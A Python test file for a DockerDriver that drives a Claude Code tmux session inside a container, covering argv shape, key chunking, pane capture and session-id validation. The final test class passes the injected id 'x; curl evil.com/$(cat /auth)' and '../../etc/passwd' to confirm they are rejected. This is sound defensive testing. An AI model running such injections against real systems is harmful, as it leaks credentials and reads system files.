"""Tests for DockerDriver — argv shape and send-keys pacing.

Mocks the DockerDriver._run hook so nothing actually spawns. Guards the
invariants the real driver must preserve: correct `docker exec` argv
(TERM=xterm-256color, tmux -t claude), chunk + Enter sequence matching
tmux_manager, and the special `!` command-mode pause.
"""

from __future__ import annotations

import asyncio

import pytest

from ccbot.docker_driver import DockerDriver


@pytest.fixture
def driver_with_spy(monkeypatch):
    """DockerDriver that records every subprocess argv without spawning,
    and with asyncio.sleep neutered so tests complete instantly.
    """
    driver = DockerDriver()
    calls: list[list[str]] = []

    async def fake_run(argv):
        calls.append(list(argv))
        return 0, b"", b""

    async def _no_sleep(_):
        return None

    monkeypatch.setattr(driver, "_run", fake_run)
    monkeypatch.setattr(asyncio, "sleep", _no_sleep)
    return driver, calls


class TestDockerExecArgv:
    """Every docker exec argv must preserve two invariants of the prefix:

    1. TERM=xterm-256color is set — without it Claude Code's TUI degrades
       to monochrome.
    2. `-w <cwd>` is set to a path OUTSIDE /workspace — the container's
       image WORKDIR must not be /workspace (a FUSE bind-mount) because
       any rclone remount invalidates its inode and every `docker exec`
       fails with "cwd outside of container mount namespace root",
       silently breaking Telegram → agent routing.

    Tests check argv shape by flag presence + position relative to the
    container name, not by fixed indices, so adding more flags later
    (e.g. `-u <user>`) doesn't flake the suite.
    """

    @staticmethod
    def _split_prefix_and_command(argv: list[str]) -> tuple[list[str], list[str]]:
        """Return (exec_flags, in_container_cmd). The container name is the
        last token before the in-container command — everything before it
        is flags to `docker exec` itself; everything after is what runs
        inside.
        """
        assert argv[0:2] == ["docker", "exec"], argv
        tmux_idx = argv.index("tmux")
        return argv[2:tmux_idx], argv[tmux_idx:]

    async def test_prefix_starts_with_docker_exec(self, driver_with_spy) -> None:
        driver, calls = driver_with_spy
        await driver.send_keys("ctn", "x")
        assert calls
        for argv in calls:
            assert argv[0] == "docker"
            assert argv[1] == "exec"

    async def test_prefix_sets_term(self, driver_with_spy) -> None:
        driver, calls = driver_with_spy
        await driver.send_keys("ctn", "x")
        for argv in calls:
            exec_flags, _ = self._split_prefix_and_command(argv)
            # -e TERM=xterm-256color appears as an adjacent pair in flags
            e_idx = exec_flags.index("-e")
            assert exec_flags[e_idx + 1] == "TERM=xterm-256color"

    async def test_prefix_pins_cwd_outside_workspace(self, driver_with_spy) -> None:
        """Image WORKDIR /workspace is a FUSE bind-mount; `docker exec` must
        override it with an explicit -w to a host-image path."""
        driver, calls = driver_with_spy
        await driver.send_keys("ctn", "x")
        for argv in calls:
            exec_flags, _ = self._split_prefix_and_command(argv)
            assert "-w" in exec_flags, (
                f"docker exec must carry -w (pin cwd outside /workspace); "
                f"got flags {exec_flags!r}"
            )
            w_idx = exec_flags.index("-w")
            cwd = exec_flags[w_idx + 1]
            assert cwd, "-w must have a non-empty value"
            assert not cwd.startswith("/workspace"), (
                f"-w must not point at /workspace (FUSE bind-mount that gets "
                f"invalidated on rclone remount); got -w {cwd!r}"
            )

    async def test_container_name_precedes_in_container_cmd(
        self, driver_with_spy
    ) -> None:
        driver, calls = driver_with_spy
        await driver.send_keys("ctn", "x")
        for argv in calls:
            exec_flags, cmd = self._split_prefix_and_command(argv)
            # Container name is the last exec_flags token
            assert exec_flags[-1] == "ctn"
            # In-container command is `tmux ... -t claude ...`
            assert cmd[0] == "tmux"

    async def test_targets_claude_tmux_session(self, driver_with_spy) -> None:
        driver, calls = driver_with_spy
        await driver.send_keys("ctn", "x")
        for argv in calls:
            # tmux -t <session> appears in both send-keys calls
            assert "tmux" in argv
            assert "-t" in argv
            ti = argv.index("-t")
            assert argv[ti + 1] == "claude"


class TestSendKeysSimple:
    async def test_short_text_sends_literal_then_enter(self, driver_with_spy) -> None:
        driver, calls = driver_with_spy
        ok = await driver.send_keys("ctn", "hello")
        assert ok is True
        assert len(calls) == 2
        # First call: literal send of "hello", `--` guards flag parsing
        assert calls[0][-3:] == ["-l", "--", "hello"]
        # Second call: Enter as interpreted key (no -l)
        assert "-l" not in calls[1]
        assert calls[1][-1] == "Enter"

    async def test_leading_dash_text_survives_flag_parsing(
        self, driver_with_spy
    ) -> None:
        """Text starting with "-" must ride behind `--`, otherwise tmux
        eats it as send-keys flags and the message is silently lost."""
        driver, calls = driver_with_spy
        ok = await driver.send_keys("ctn", "--force и без него")
        assert ok is True
        assert calls[0][-3:] == ["-l", "--", "--force и без него"]

    async def test_empty_text_still_sends_enter(self, driver_with_spy) -> None:
        """Edge case: sending an empty string should still submit (Enter)."""
        driver, calls = driver_with_spy
        ok = await driver.send_keys("ctn", "")
        assert ok is True
        # One empty literal, then Enter.
        assert calls[-1][-1] == "Enter"


class TestSendKeysChunking:
    async def test_long_text_is_chunked(self, driver_with_spy) -> None:
        """Text longer than 200 chars must split into 200-char chunks."""
        driver, calls = driver_with_spy
        text = "a" * 450  # expect chunks of 200, 200, 50
        await driver.send_keys("ctn", text)
        literal_chunks = [c[-1] for c in calls if "-l" in c]
        assert len(literal_chunks) == 3
        assert literal_chunks[0] == "a" * 200
        assert literal_chunks[1] == "a" * 200
        assert literal_chunks[2] == "a" * 50
        assert calls[-1][-1] == "Enter"


class TestSendKeysBashMode:
    async def test_bang_splits_first_char(self, driver_with_spy) -> None:
        """Claude Code's ``!`` bash-mode trick: send ``!`` alone first so
        the TUI switches modes, then the rest after a 1s pause.
        """
        driver, calls = driver_with_spy
        await driver.send_keys("ctn", "!ls -la")
        literal_chunks = [c[-1] for c in calls if "-l" in c]
        assert literal_chunks[0] == "!"
        assert literal_chunks[1] == "ls -la"
        assert calls[-1][-1] == "Enter"


class TestSendKeysSpecial:
    async def test_non_literal_sends_named_key(self, driver_with_spy) -> None:
        """With literal=False we're sending a key name like ``Escape`` — the
        driver must omit the ``-l`` flag so tmux interprets it.
        """
        driver, calls = driver_with_spy
        ok = await driver.send_keys("ctn", "Escape", enter=False, literal=False)
        assert ok is True
        assert len(calls) == 1
        assert "-l" not in calls[0]
        assert calls[0][-1] == "Escape"

    async def test_literal_no_enter(self, driver_with_spy) -> None:
        driver, calls = driver_with_spy
        await driver.send_keys("ctn", "text", enter=False, literal=True)
        assert len(calls) == 1
        assert calls[0][-3:] == ["-l", "--", "text"]


class TestSendKeysFailurePropagates:
    async def test_nonzero_rc_returns_false(self, monkeypatch) -> None:
        driver = DockerDriver()

        async def fake_run(argv):
            return 1, b"", b"no such container"

        async def _no_sleep(_):
            return None

        monkeypatch.setattr(driver, "_run", fake_run)
        monkeypatch.setattr(asyncio, "sleep", _no_sleep)
        assert await driver.send_keys("ctn", "hi") is False


class TestCapturePane:
    @staticmethod
    def _tmux_args(argv: list[str]) -> list[str]:
        """Slice off docker-exec prefix so we can assert on tmux flags
        without tripping over the leading ``-e TERM=xterm-256color``.
        """
        return argv[argv.index("tmux") :]

    async def test_plain_capture(self, driver_with_spy) -> None:
        driver, calls = driver_with_spy
        await driver.capture_pane("ctn")
        assert len(calls) == 1
        tmux_args = self._tmux_args(calls[0])
        assert "capture-pane" in tmux_args
        assert "-p" in tmux_args
        assert "-e" not in tmux_args  # ANSI flag not requested

    async def test_ansi_capture_adds_e_flag(self, driver_with_spy) -> None:
        driver, calls = driver_with_spy
        await driver.capture_pane("ctn", with_ansi=True)
        tmux_args = self._tmux_args(calls[0])
        assert "-e" in tmux_args
        assert "-p" in tmux_args


class TestIsContainerAlive:
    async def test_true_on_running(self, monkeypatch) -> None:
        driver = DockerDriver()

        async def fake_run(argv):
            assert argv[0:2] == ["docker", "inspect"]
            return 0, b"true\n", b""

        monkeypatch.setattr(driver, "_run", fake_run)
        assert await driver.is_container_alive("ctn") is True

    async def test_false_on_stopped(self, monkeypatch) -> None:
        driver = DockerDriver()

        async def fake_run(argv):
            return 0, b"false\n", b""

        monkeypatch.setattr(driver, "_run", fake_run)
        assert await driver.is_container_alive("ctn") is False

    async def test_false_on_missing(self, monkeypatch) -> None:
        driver = DockerDriver()

        async def fake_run(argv):
            return 1, b"", b"Error: No such container"

        monkeypatch.setattr(driver, "_run", fake_run)
        assert await driver.is_container_alive("ctn") is False


class TestStartSessionResumeValidation:
    """``resume_session_id`` lands in a shell command the container runs
    through ``/bin/sh -c``; a malicious container-controlled id would be a
    container-internal command-injection vector. Valid ids get through,
    bad ones are dropped and the session starts fresh."""

    @staticmethod
    def _fake_run_capture():
        calls: list[list[str]] = []

        async def fake_run(argv):
            calls.append(list(argv))
            return 0, b"", b""

        return fake_run, calls

    async def test_valid_uuid_is_interpolated(self, monkeypatch) -> None:
        driver = DockerDriver()
        fake_run, calls = self._fake_run_capture()
        monkeypatch.setattr(driver, "_run", fake_run)

        await driver.start_session(
            "ctn", resume_session_id="abc12345-dead-beef-cafe-1234567890ab"
        )
        # calls[0] is the `tmux new-session` invocation (start_session also
        # follows up with ensure_pane_size → a couple more `_run`s); the
        # session id only ever rides on that first command.
        assert calls
        last_arg = calls[0][-1]
        assert "--resume abc12345-dead-beef-cafe-1234567890ab" in last_arg

    async def test_shell_metachars_rejected(self, monkeypatch) -> None:
        driver = DockerDriver()
        fake_run, calls = self._fake_run_capture()
        monkeypatch.setattr(driver, "_run", fake_run)

        await driver.start_session(
            "ctn", resume_session_id="x; curl evil.com/$(cat /auth)"
        )
        # calls[0] is the `tmux new-session` invocation (ensure_pane_size
        # adds more `_run`s after); the malformed id must not reach it.
        assert calls
        last_arg = calls[0][-1]
        assert "--resume" not in last_arg
        assert "curl" not in last_arg
        assert "evil.com" not in last_arg

    async def test_traversal_rejected(self, monkeypatch) -> None:
        driver = DockerDriver()
        fake_run, calls = self._fake_run_capture()
        monkeypatch.setattr(driver, "_run", fake_run)

        await driver.start_session("ctn", resume_session_id="../../etc/passwd")
        assert "--resume" not in calls[0][-1]

    async def test_too_short_rejected(self, monkeypatch) -> None:
        driver = DockerDriver()
        fake_run, calls = self._fake_run_capture()
        monkeypatch.setattr(driver, "_run", fake_run)

        await driver.start_session("ctn", resume_session_id="short")
        assert "--resume" not in calls[0][-1]

    async def test_no_resume_id_starts_fresh(self, monkeypatch) -> None:
        driver = DockerDriver()
        fake_run, calls = self._fake_run_capture()
        monkeypatch.setattr(driver, "_run", fake_run)

        await driver.start_session("ctn")
        assert "--resume" not in calls[0][-1]
